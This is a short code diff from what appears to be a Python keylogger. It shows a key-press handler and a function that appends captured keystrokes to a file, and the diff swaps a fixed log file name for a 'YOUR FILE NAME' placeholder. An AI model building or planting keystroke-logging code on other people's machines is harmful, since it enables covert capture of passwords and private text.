@@ -12,7 +12,7 @@ def on_press(key):
         write_file(keys)
         keys = []
 def write_file(keys):
-    with open("logout.txt", "a") as f:
+    with open("YOUR FILE NAME", "a") as f:
         for key in keys:
             k = str(key).replace("'", "")
             if k.find("space") > 0:
